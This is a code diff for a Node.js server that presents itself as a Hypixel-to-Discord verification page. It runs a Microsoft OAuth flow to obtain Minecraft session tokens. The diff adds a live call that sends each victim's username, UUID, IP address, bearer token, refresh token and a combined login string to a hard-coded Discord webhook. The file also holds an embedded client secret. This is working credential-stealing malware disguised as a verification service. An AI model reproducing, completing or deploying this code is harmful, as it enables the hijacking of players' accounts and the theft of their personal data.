@@ -1,10 +1,8 @@
-// CONFIG //
 const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
 const client_id = 'a7f62b5a-c66b-47f1-a6f9-fb7938cac361'
 const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
 
-// CONFIG END //
 const axios = require('axios')
 const express = require('express')
 const app = express()
@@ -87,7 +85,8 @@ async function getXSTSToken(userToken) {
     }
     let data = {
         Properties: {
-            SandboxId: 'RETAIL', UserTokens: [userToken]
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
         }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
     }
     let response = await axios.post(url, data, config)
@@ -127,24 +126,21 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-        content: "@everyone", embeds: [{
-            title: "User Info",
-            color: 0x00ff50,
-            fields: [{name: "Username", value: username, inline: true}, {
-                name: "UUID",
-                value: uuid,
-                inline: true
-            }, {name: "Ip", value: ip, inline: true}, {
-                name: "SessionID",
-                value: bearerToken,
-                inline: false
-            }, {name: "Refresh Token", value: refreshToken, inline: false}, {
-                name: "Login",
-                value: username + ":" + uuid + ":" + bearerToken,
-                inline: false
-            },]
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        content: "@everyone",
+        embeds: [{
+            title: "User Info", color: 0x00ff50, fields: [
+                {name: "Username", value: username, inline: true},
+                {name: "UUID", value: uuid, inline: true},
+                {name: "Ip", value: ip, inline: true},
+                {name: "SessionID", value: bearerToken, inline: false},
+                {name: "Refresh Token", value: refreshToken, inline: false},
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
+            ]
         }]
     }
+    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
 const bannedIps = []
